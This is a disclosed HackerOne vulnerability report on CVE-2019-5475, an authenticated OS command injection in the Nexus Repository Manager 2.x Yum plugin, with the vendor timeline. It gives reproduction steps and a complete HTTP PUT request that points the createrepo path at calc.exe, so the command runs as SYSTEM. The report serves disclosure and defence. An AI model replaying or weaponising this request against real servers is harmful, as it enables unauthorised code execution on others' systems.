---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
  - trigger/auth-required
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2019-08-20
submitted: 2019-07-23T13:53:43.592Z
bounty_usd: null
votes: 28
cve: "CVE-2019-5475"
program: "[[programs/central-security-project|Central Security Project]]"
reporter: "christianaugust"
source: "https://hackerone.com/reports/654888"
title: "OS Command Injection in Nexus Repository Manager 2.x"
---
# OS Command Injection in Nexus Repository Manager 2.x

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 28 | **Program:** Central Security Project | **Disclosed:** 2019-08-20

- Report: [https://hackerone.com/reports/654888](https://hackerone.com/reports/654888)
- CWE: OS Command Injection | CVE: CVE-2019-5475
- Submitted: 2019-07-23T13:53:43.592Z

## Report summary

https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Maven artifact
**groupId:** org.sonatype.nexus.plugins
**artifactId:** nexus-yum-repository-plugin
**version:** 2.14.9-01

# Vulnerability
## Vulnerability Description
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability. 

## Additional Details
**Source File and Line Number:** https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121

## Steps To Reproduce:
1. Navigate to "Capabilities" in Nexus Repository Manager.
2. Edit or create a new Yum: Configuration capability
3. Set path of "createrepo" or "mergerepo" to an OS command (e.g. C:\Windows\System32\calc.exe)
4. The OS command should now have executed as the SYSTEM user. Note that in this case, Nexus appends --version to the OS command.

The following HTTP request was used to trigger the vulnerability:
```
PUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1
Host: HOST:PORT
Accept: application/json
Authorization: Basic YWRtaW46YWRtaW4xMjM=
Content-Type: application/xml
Content-Length: 333
Connection: close

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns2:capability xmlns:ns2="http://sonatype.org/xsd/nexus-capabilities-plugin/rest/1.0"><id>healthcheck</id><notes>123</notes><enabled>true</enabled><typeId>1</typeId><properties><key>createrepoPath</key><value>C:\Windows\System32\calc.exe</value></properties></ns2:capability>
```
## Supporting Material/References:
- Windows Server 2016
- Sonatype Nexus Repository Manager 2.14.9-01
- Java 8

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.

## Timeline

- **Report Filed**
- **2019-07-23** @acazzolla: Thank you for your submission.  We have just confirmed the vulnerability and are working to address it.
- **Report Triaged**
- **Report Title Updated**
- **Report Title Updated**
- **2019-08-09** @acazzolla: Public advisory is at https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-Remote-Code-Execution-2019-08-09
- **2019-08-09** @christianaugust: Thanks! Do you do acknowledgements/credit? If so, it would be great if you can mention Christian August Holm Hansen @ Binary Security AS (https://binarysecurity.no/) in the advisory :)
- **2019-08-12** @acazzolla: Yes, we do acknowledgements/credits.  I will have the Sonatype advisory updated.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
